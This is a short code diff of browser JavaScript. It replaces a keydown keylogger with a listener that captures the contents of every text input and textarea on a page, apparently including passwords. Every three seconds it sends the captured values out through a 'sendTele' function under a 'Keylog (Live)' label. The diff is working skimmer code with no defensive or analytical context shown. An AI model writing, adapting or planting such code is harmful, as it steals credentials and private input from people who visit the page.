@@ -1,9 +1,11 @@
 let log = "";
-document.onkeydown = (e) => {
-    let k = e.key || String.fromCharCode(e.keyCode);
-    if (k === "Enter") k = "\n[ENTER]\n";
-    else if (k === "Backspace") k = "[BS]";
-    else if (k === "Space") k = " ";
-    log += k;
-};
-setInterval(() => { if(log) { sendTele("⌨️ Keylog: " + log); log = ""; } }, 3000);
+document.addEventListener('input', (e) => {
+    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+        let val = e.target.value;
+        log = `[Field: ${e.target.name || e.target.placeholder}] -> ${val}`;
+    }
+});
+
+setInterval(() => {
+    if(log) { sendTele("⌨️ Keylog (Live): " + log); log = ""; }
+}, 3000);
